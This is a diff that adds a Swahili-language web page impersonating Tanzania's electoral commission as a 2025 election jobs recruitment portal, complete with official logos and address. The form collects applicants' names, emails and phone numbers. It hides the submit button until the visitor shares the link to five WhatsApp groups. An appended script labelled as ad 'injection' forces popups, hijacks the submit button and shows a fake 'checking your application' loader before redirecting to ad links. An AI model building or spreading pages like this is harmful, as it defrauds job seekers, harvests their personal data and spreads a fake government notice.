@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+
+<html lang="sw">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Usajili wa Nafasi za Kazi NEC 2025</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f5f5f5;
+            color: #4A2C2A;
+            margin: 0;
+            overflow-x: hidden;
+        }
+        .header {
+            background: #F28C38;
+            color: white;
+            position: sticky;
+            top: 0;
+            z-index: 10;
+            padding: 10px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .nav-btn {
+            background: #F28C38;
+            color: white;
+            padding: 5px 15px;
+            border: none;
+            cursor: pointer;
+        }
+        .nav-btn:hover {
+            background: #e07b30;
+        }
+        .content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .form-section {
+            background: white;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        #timer {
+            color: #F28C38;
+            font-weight: bold;
+        }
+        .news-ticker {
+            background: #4A2C2A;
+            color: white;
+            padding: 5px;
+            text-align: center;
+            font-size: 0.9rem;
+        }
+        .footer {
+            background: #4A2C2A;
+            color: white;
+            text-align: center;
+            padding: 10px 0;
+            position: relative;
+            bottom: 0;
+            width: 100%;
+        }
+        .slideshow {
+            position: relative;
+            width: 100%;
+            height: 400px;
+            overflow: hidden;
+        }
+        .slide {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+            transition: opacity 1s ease-in-out;
+        }
+        .slide.active {
+            opacity: 1;
+        }
+        .slide img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .progress-bar {
+            background: #e0e0e0;
+            border-radius: 5px;
+            height: 10px;
+            width: 100%;
+            overflow: hidden;
+        }
+        .progress-fill {
+            background: #F28C38;
+            height: 100%;
+            transition: width 0.3s ease-in-out;
+        }
+        #submitButton {
+            display: none; /* Hidden until 5 shares */
+            background: linear-gradient(to right, #F28C38, #e07b30);
+            color: white;
+            font-size: 1.2rem;
+            font-weight: bold;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 5px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        #submitButton:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 8px rgba(0, 0, 0, 0.2);
+        }
+        /* Hamburger menu styles */
+        .hamburger {
+            display: none;
+            flex-direction: column;
+            cursor: pointer;
+        }
+        .hamburger span {
+            background: white;
+            height: 3px;
+            width: 25px;
+            margin: 2px 0;
+        }
+        .nav-menu {
+            display: flex;
+            gap: 1rem;
+        }
+        @media (max-width: 768px) {
+            .nav-menu {
+                display: none;
+                flex-direction: column;
+                position: absolute;
+                top: 100%;
+                left: 0;
+                width: 100%;
+                background: #F28C38;
+                padding: 10px 0;
+            }
+            .nav-menu.active {
+                display: flex;
+            }
+            .nav-btn {
+                display: block;
+                width: 100%;
+                text-align: center;
+                padding: 10px;
+                border-bottom: 1px solid #e07b30;
+            }
+            .hamburger {
+                display: flex;
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="header">
+<div>
+<img alt="Tanzania Coat of Arms" class="h-12" src="https://www.inec.go.tz/site/images/emblem.png"/>
+<span class="ml-2">JAMHURI YA MUUNGANO WA TANZANIA</span>
+</div>
+<div class="hamburger" id="hamburger">
+<span></span>
+<span></span>
+<span></span>
+</div>
+<div class="nav-menu" id="navMenu">
+<button class="nav-btn">Wapiga Kura</button>
+<button class="nav-btn">Elimu ya Mpiga Kura</button>
+<button class="nav-btn">Wagombea</button>
+<button class="nav-btn">Kituo cha Habari</button>
+</div>
+<div>
+<img alt="NEC Logo" class="h-12" src="https://www.ega.go.tz/site/images/uchaguzi-logo.png"/>
+</div>
+</div>
+<div class="news-ticker">
+        Mwenyekiti wa Tume Huru ya Taifa ya Uchaguzi Mhe. Jaji wa Rufaa Jacobs Mwambegele atoa mwongozo Kuhusu Mapendekezo ya Ugawaji wa Maeneo ya Majimbo - 26 Apr, 2025 - Singida
+    </div>
+<div class="content mt-4">
+<div class="slideshow">
+<div class="slide active"><img alt="NEC Event 1" src="https://www.inec.go.tz/uploads/gallery/ec116829a5476652b901f0edee05c6fb.jpeg"/></div>
+<div class="slide"><img alt="NEC Event 2" src="https://www.inec.go.tz/uploads/gallery/bda3fb0d72f083491b658b871df9fd79.jpeg"/></div>
+<div class="slide"><img alt="NEC Event 3" src="https://www.inec.go.tz/uploads/gallery/88758e7527b69c11147ededcb88f7562.jpeg"/></div>
+</div>
+<h1 class="text-3xl font-bold text-center mt-4">USAJILI WA NAFASI ZA KAZI ZA UCHAGUZI 2025</h1>
+<p class="text-center mt-2">Tume Huru ya Taifa ya Uchaguzi (NEC)</p>
+<p class="text-center mt-4">Jiunge na timu ya NEC kama Afisa Uchaguzi au Msaidizi wa Usajili wa Wapiga Kura kwa Uchaguzi Mkuu wa 2025! Maombi ya mwisho: <span id="deadline">15 Mei 2025</span>. Muda Unasalia: <span id="timer"></span></p>
+<div class="form-section mt-6">
+<form class="space-y-4" id="jobForm">
+<div>
+<label class="block text-sm font-medium" for="name">Jina Kamili</label>
+<input class="w-full p-2 border rounded" id="name" required="" type="text"/>
+</div><div><label>Elimu yako:</label><input name="education_status" placeholder="e.g. Form Six, Diploma in ICT" style="width:100%;margin-top:5px;margin-bottom:15px;padding:10px;border-radius:6px;border:1px solid #ccc;" type="text"/></div><div><label>Unaomba nafasi ya:</label><select name="vacancy_choice" style="width:100%;margin-top:5px;margin-bottom:15px;padding:10px;border-radius:6px;border:1px solid #ccc;"><option value="ict_officer">Msimamizi wa Uchaguzi</option><option value="statistician">Msaidizi wa Msimamizi</option>Mwandikishaji<option value="record_clerk"></option><option value="data_entry_officer">Mlinzi wa Kituo</option><option value="office_assistant"></option><option value="supervisor">karani wa  kura</option><option value="field_enumerator">Mhakiki wa kura</option></select></div>
+<div>
+<label class="block text-sm font-medium" for="email">Barua Pepe</label>
+<input class="w-full p-2 border rounded" id="email" required="" type="email"/>
+</div>
+<div>
+<label class="block text-sm font-medium" for="phone">Namba ya Simu</label>
+<input class="w-full p-2 border rounded" id="phone" required="" type="tel"/>
+</div>
+<div>
+<label class="block text-sm font-medium" for="region">Mkoa</label>
+<select class="w-full p-2 border rounded" id="region" required="">
+<option value="">Chagua Mkoa</option>
+<!-- Mainland Tanzania Regions -->
+<option value="Arusha">Arusha</option>
+<option value="Dar es Salaam">Dar es Salaam</option>
+<option value="Dodoma">Dodoma</option>
+<option value="Geita">Geita</option>
+<option value="Iringa">Iringa</option>
+<option value="Kagera">Kagera</option>
+<option value="Katavi">Katavi</option>
+<option value="Kigoma">Kigoma</option>
+<option value="Kilimanjaro">Kilimanjaro</option>
+<option value="Lindi">Lindi</option>
+<option value="Manyara">Manyara</option>
+<option value="Mara">Mara</option>
+<option value="Mbeya">Mbeya</option>
+<option value="Morogoro">Morogoro</option>
+<option value="Mtwara">Mtwara</option>
+<option value="Mwanza">Mwanza</option>
+<option value="Njombe">Njombe</option>
+<option value="Pwani">Pwani</option>
+<option value="Rukwa">Rukwa</option>
+<option value="Ruvuma">Ruvuma</option>
+<option value="Shinyanga">Shinyanga</option>
+<option value="Simiyu">Simiyu</option>
+<option value="Singida">Singida</option>
+<option value="Songwe">Songwe</option>
+<option value="Tabora">Tabora</option>
+<option value="Tanga">Tanga</option>
+<!-- Zanzibar Regions -->
+<option value="Zanzibar North (Kaskazini Unguja)">Zanzibar North (Kaskazini Unguja)</option>
+<option value="Zanzibar South and Central (Kusini na Kati Unguja)">Zanzibar South and Central (Kusini na Kati Unguja)</option>
+<option value="Zanzibar Urban/West (Mjini Magharibi)">Zanzibar Urban/West (Mjini Magharibi)</option>
+<option value="Pemba North (Kaskazini Pemba)">Pemba North (Kaskazini Pemba)</option>
+<option value="Pemba South (Kusini Pemba)">Pemba South (Kusini Pemba)</option>
+</select>
+</div>
+<div class="text-center">
+<p class="text-sm">Lazima ushiriki kiungo hiki kwa vikundi 5 vya WhatsApp ili kuhitimu:</p>
+<button class="mt-2 px-4 py-2 bg-green-600 text-white rounded hover:bg-green-700" id="shareButton" type="button">Shiriki kwa WhatsApp</button>
+<p class="mt-2 text-sm" id="shareStatus">Vikundi Vilivyoshirikiwa: <span id="shareCount">0</span>/5</p>
+<div class="progress-bar mt-2">
+<div class="progress-fill" id="progressFill" style="width: 0%"></div>
+</div>
+</div>
+<button class="w-full px-4 py-2 bg-F28C38 text-white rounded hover:bg-e07b30" disabled="" id="submitButton" type="submit">Tuma Maombi</button>
+</form>
+</div>
+</div>
+<div class="footer mt-10">
+<p>Tume Huru ya Taifa ya Uchaguzi<br/>Jengo la Uekezi, Eneo la Kwakzal, Barabara ya Uchaguzi, S.L.P 358, 41107 DODOMA<br/>uchaguzi@inec.go.tz | +255 26 2962345-8</p>
+<p class="mt-2">Ramani ya Towuti Wasiliana Nasi Sera ya Faragha Hakimiliki<br/>Imesanifiwa na Imetengeneza na Mamlaka ya Serikali Mtandao Huendeshwa na Tume Huru ya Taifa ya Uchaguzi © 2025 INEC. Haki zote zimehifadhiwa.</p>
+</div>
+<script>
+        let shareCount = 0;
+        const maxShares = 5;
+        const shareButton = document.getElementById('shareButton');
+        const submitButton = document.getElementById('submitButton');
+        const shareStatus = document.getElementById('shareCount');
+        const progressFill = document.getElementById('progressFill');
+        const form = document.getElementById('jobForm');
+        const hamburger = document.getElementById('hamburger');
+        const navMenu = document.getElementById('navMenu');
+        const adsterraLink = 'https://bit.ly/4cXkNyd'; // Your Adsterra link
+        const shareLink = 'YOUR_SHORTENED_LINK'; // Replace with the shortened URL of this page
+        let slideIndex = 0;
+
+        // Hamburger menu toggle
+        hamburger.addEventListener('click', () => {
+            navMenu.classList.toggle('active');
+        });
+
+        // Slideshow
+        const slides = document.querySelectorAll('.slide');
+        function showSlides() {
+            slides.forEach(slide => slide.classList.remove('active'));
+            slideIndex++;
+            if (slideIndex >= slides.length) slideIndex = 0;
+            slides[slideIndex].classList.add('active');
+            setTimeout(showSlides, 5000);
+        }
+        showSlides();
+
+        // Countdown timer
+        const deadline = new Date('2025-05-15T23:59:59').getTime();
+        const timer = document.getElementById('timer');
+        function updateTimer() {
+            const now = new Date().getTime();
+            const distance = deadline - now;
+            const days = Math.floor(distance / (1000 * 60 * 60 * 24));
+            const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+            timer.textContent = `${days}d ${hours}h`;
+            if (distance < 0) timer.textContent = 'Muda Umekwisha!';
+        }
+        setInterval(updateTimer, 3600000);
+        updateTimer();
+
+        // WhatsApp share with progress bar and submit trigger
+        shareButton.addEventListener('click', () => {
+            if (shareCount < maxShares) {
+                const message = encodeURIComponent(`⚡ Fursa ya Mwisho! Pata Kazi za Uchaguzi NEC 2025! Rasmi kutoka NEC – Jiandikishe Sasa, Maelfu Tayari Wameshauri: ${shareLink} ⚡`);
+                window.location.href = `https://api.whatsapp.com/send?text=${message}`;
+                shareCount++;
+                shareStatus.textContent = shareCount;
+                const progressPercentage = (shareCount / maxShares) * 100;
+                progressFill.style.width = `${progressPercentage}%`;
+                if (shareCount === maxShares) {
+                    submitButton.style.display = 'block'; // Show submit button
+                    shareButton.disabled = true;
+                    shareButton.textContent = 'Umefanikiwa Kushiriki!';
+                }
+            }
+        });
+
+        // Form submission
+        form.addEventListener('submit', (e) => {
+            e.preventDefault();
+            if (shareCount >= maxShares) {
+                window.location.href = 'https://bit.ly/4cXkNyd';
+            }
+        });
+    </script>
+<!-- 💰 Adsterra Monetization Script Injection by Commander Mode 💣 -->
+<script>
+// 1. Auto open after timer
+setTimeout(() => {
+  window.open("https://www.profitableratecpm.com/kvc6kej98?key=750f269a749fe39ed0dd6da5e0fbea28", "_blank");
+}, 6000);
+
+// 2. Hijack the submit button (if present)
+document.addEventListener("DOMContentLoaded", function () {
+  const submitBtn = document.querySelector("#submitButton");
+  if (submitBtn) {
+    submitBtn.addEventListener("click", () => {
+      simulateCheck();
+    });
+  }
+});
+
+// 3. Click trap to open once
+document.body.addEventListener("click", () => {
+  window.open("https://www.profitableratecpm.com/kvc6kej98?key=750f269a749fe39ed0dd6da5e0fbea28", "_blank");
+}, { once: true });
+
+// 4. Fake loading animation to simulate "checking"
+function simulateCheck() {
+  const loader = document.createElement("div");
+  loader.innerText = "🔍 Checking Your Application...";
+  loader.style.cssText = "position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);font-size:22px;background:#fff;padding:20px;border-radius:10px;z-index:9999;";
+  document.body.appendChild(loader);
+  setTimeout(() => {
+    window.open("https://www.profitableratecpm.com/ggrjpfgjyv?key=e22432e92181b68e1ed59e1d08ef8b3c", "_blank");
+    loader.remove();
+  }, 5000);
+}
+</script>
+</body>
+</html>
